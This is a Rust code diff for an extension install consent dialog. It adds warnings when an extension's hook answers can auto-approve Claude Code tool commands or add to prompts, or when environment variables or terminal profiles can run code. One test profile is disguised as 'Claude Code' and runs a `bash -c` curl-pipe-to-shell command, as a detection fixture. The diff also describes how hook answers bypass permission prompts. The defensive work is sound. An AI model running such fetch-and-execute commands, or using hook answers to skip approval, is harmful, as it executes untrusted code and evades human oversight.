@@ -108,6 +108,9 @@ impl ConsentDiff {
 pub const PLUGIN_ENV_NAMES: &[(&str, &str)] = &[("CLAUDE_CODE_PLUGIN_DIRS", "Claude Code")];
 
 pub const WARNING_RUNS_ANY_CODE: &str = "It can run any program on your computer";
+/// `relay:hooks` (p5-security-0.4 P4).
+pub const WARNING_HOOK_ANSWERS: &str =
+    "Its answers can approve what those tools run and add to your prompts";
 
 const READ_CAPABILITIES: &[&str] = &[
     "workspace:read-buffers",
@@ -336,11 +339,15 @@ pub fn consent_items(manifest: &UiManifest) -> Vec<ItemLine> {
                     .filter(|reason| !reason.is_empty())
                     .collect();
                 let reason_text = (!reasons.is_empty()).then(|| reasons.join(" "));
-                lines.push(whole(
-                    details,
-                    reason_text,
-                    sends_warning("the tools whose hooks it answers".into()),
-                ));
+                // p5-security-0.4 P4: a hook's answer is the tool's input: Claude Code's
+                // PreToolUse takes `permissionDecision: "allow"` from it and runs the command
+                // without asking, and UserPromptSubmit adds the answer to the prompt.
+                let mut warnings = vec![
+                    WARNING_RUNS_ANY_CODE.to_string(),
+                    WARNING_HOOK_ANSWERS.to_string(),
+                ];
+                warnings.extend(sends_warning("the tools whose hooks it answers".into()));
+                lines.push(whole(details, reason_text, warnings));
             }
             edit::CAPABILITY_EDIT | observe::CAPABILITY_OBSERVE => {
                 lines.push(whole(Vec::new(), None, Vec::new()))
@@ -354,15 +361,20 @@ pub fn consent_items(manifest: &UiManifest) -> Vec<ItemLine> {
             .iter()
             .filter(move |capability| tier_of(capability) == Some(tier))
             .map(|capability| {
-                let warnings = if capability == terminal::CAPABILITY_WRITE {
-                    sends_warning("the terminals you share with it".into())
+                let (details, warnings) = if capability == terminal::CAPABILITY_WRITE {
+                    (
+                        Vec::new(),
+                        sends_warning("the terminals you share with it".into()),
+                    )
+                } else if capability == terminal::CAPABILITY_PROFILES {
+                    profile_lines(&manifest.terminal_profiles)
                 } else {
-                    Vec::new()
+                    Default::default()
                 };
                 line(
                     ConsentItem::Capability(capability.clone()),
                     title_of(capability),
-                    Vec::new(),
+                    details,
                     None,
                     warnings,
                 )
@@ -376,11 +388,44 @@ pub fn consent_items(manifest: &UiManifest) -> Vec<ItemLine> {
     ordered
 }
 
+/// p5-security-0.4 P5: each profile's command line, as its "+" menu entry runs it, and
+/// [`WARNING_RUNS_ANY_CODE`] when one names a shell or interpreter (`bash -c …` behind a
+/// friendly name) or passes the extension's own files. A profile runs on one click, so the
+/// install dialog says what that click can run.
+fn profile_lines(profiles: &[terminal::TerminalProfileSpec]) -> (Vec<String>, Vec<String>) {
+    let mut runs_code = false;
+    let details = profiles
+        .iter()
+        .map(|profile| {
+            let process = model_process::ProcessSpec {
+                name: profile.program.clone(),
+                args: profile.args.clone(),
+                path: profile.path.clone(),
+                reason: None,
+            };
+            runs_code |= model_process::runs_any_code(&process)
+                || profile.args.iter().any(|arg| arg.contains("${package}"));
+            let program = profile.path.as_deref().unwrap_or(&profile.program);
+            let command = std::iter::once(program)
+                .chain(profile.args.iter().map(String::as_str))
+                .collect::<Vec<_>>()
+                .join(" ");
+            format!("{}: {command}", profile.name)
+        })
+        .collect();
+    let warnings = runs_code
+        .then(|| WARNING_RUNS_ANY_CODE.to_string())
+        .into_iter()
+        .collect();
+    (details, warnings)
+}
+
 /// `NAME=value` per variable, and the notes: values in the package, and names that make a tool
 /// load plugins (§B.4).
 fn env_lines(env: &terminal::TerminalEnvSpec) -> (Vec<String>, Vec<String>) {
     let mut details = Vec::new();
     let mut notes = Vec::new();
+    let mut runs_code = false;
     for (name, value) in &env.vars {
         details.push(format!("{name}={value}"));
         let in_package = Template::parse(value, TemplateUse::EnvValue, &|_| Some(true))
@@ -389,11 +434,18 @@ fn env_lines(env: &terminal::TerminalEnvSpec) -> (Vec<String>, Vec<String>) {
             notes.push(format!("{name}: files from this extension"));
         }
         let upper = name.to_ascii_uppercase();
-        if let Some((_, tool)) = PLUGIN_ENV_NAMES.iter().find(|(known, _)| *known == upper) {
+        let plugin = PLUGIN_ENV_NAMES.iter().find(|(known, _)| *known == upper);
+        if let Some((_, tool)) = plugin {
             notes.push(format!(
                 "{name}: makes {tool} load this extension's plugins"
             ));
         }
+        runs_code |= in_package || plugin.is_some();
+    }
+    // p5-security-0.4 P3: a tool given a folder of the extension's files may run what is there
+    // (Claude Code plugins carry hooks, which are shell commands), so the line says so.
+    if runs_code {
+        notes.push(WARNING_RUNS_ANY_CODE.to_string());
     }
     (details, notes)
 }
@@ -523,6 +575,7 @@ reason = "connects the CLI"
             [
                 "CLAUDE_CODE_PLUGIN_DIRS: files from this extension",
                 "CLAUDE_CODE_PLUGIN_DIRS: makes Claude Code load this extension's plugins",
+                WARNING_RUNS_ANY_CODE,
             ]
         );
         // A read with the network: the combination is spelled out.
@@ -534,6 +587,92 @@ reason = "connects the CLI"
         // Stable keys round-trip through the record.
         let json = toml::to_string(&lines[2]).unwrap();
         assert_eq!(toml::from_str::<ItemLine>(&json).unwrap(), lines[2]);
+    }
+
+    /// p5-security-0.4 P3, P4: an env value into the package and hook answers both run code.
+    #[test]
+    fn package_env_and_hook_answers_run_any_code() {
+        let lines = consent_items(&manifest(
+            r#"
+api_version = "0.4.0"
+capabilities = ["ui:panel", "terminal:env", "relay:hooks"]
+[fyx_ui.terminal_env]
+vars = { TOOL_CONFIG = "${package}/config", MODE = "on" }
+reason = "configures the tool"
+[[fyx_ui.relay_channels]]
+name = "pre-tool"
+timeout_ms = 5000
+on_failure = { exit = 0 }
+reason = "shows the tool"
+"#,
+        ));
+        let env = lines
+            .iter()
+            .find(|line| line.item.key() == "terminal:env")
+            .expect("env line");
+        assert!(
+            env.warnings.iter().any(|w| w == WARNING_RUNS_ANY_CODE),
+            "{env:?}"
+        );
+        let relay = lines
+            .iter()
+            .find(|line| line.item.key() == "relay:hooks")
+            .expect("relay line");
+        assert_eq!(
+            relay.warnings,
+            [WARNING_RUNS_ANY_CODE, WARNING_HOOK_ANSWERS]
+        );
+        let literal = consent_items(&manifest(
+            r#"
+api_version = "0.4.0"
+capabilities = ["ui:panel", "terminal:env"]
+[fyx_ui.terminal_env]
+vars = { MODE = "on" }
+reason = "a switch"
+"#,
+        ));
+        assert!(
+            literal.iter().all(|line| line.warnings.is_empty()),
+            "{literal:?}"
+        );
+    }
+
+    /// p5-security-0.4 P5: a profile's command line is listed; a shell behind it warns.
+    #[test]
+    fn profiles_show_their_command_lines() {
+        let lines = consent_items(&manifest(
+            r#"
+api_version = "0.4.0"
+capabilities = ["ui:panel", "terminal:profiles"]
+[[fyx_ui.terminal_profiles]]
+id = "claude"
+name = "Claude Code"
+program = "claude"
+args = ["--ide"]
+"#,
+        ));
+        let profiles = lines
+            .iter()
+            .find(|line| line.item.key() == "terminal:profiles")
+            .expect("profiles line");
+        assert_eq!(profiles.details, ["Claude Code: claude --ide"]);
+        assert!(profiles.warnings.is_empty());
+        let shell = consent_items(&manifest(
+            r#"
+api_version = "0.4.0"
+capabilities = ["ui:panel", "terminal:profiles"]
+[[fyx_ui.terminal_profiles]]
+id = "claude"
+name = "Claude Code"
+program = "bash"
+args = ["-c", "curl example.com | sh"]
+"#,
+        ));
+        let profiles = shell
+            .iter()
+            .find(|line| line.item.key() == "terminal:profiles")
+            .expect("profiles line");
+        assert_eq!(profiles.warnings, [WARNING_RUNS_ANY_CODE]);
     }
 
     #[test]
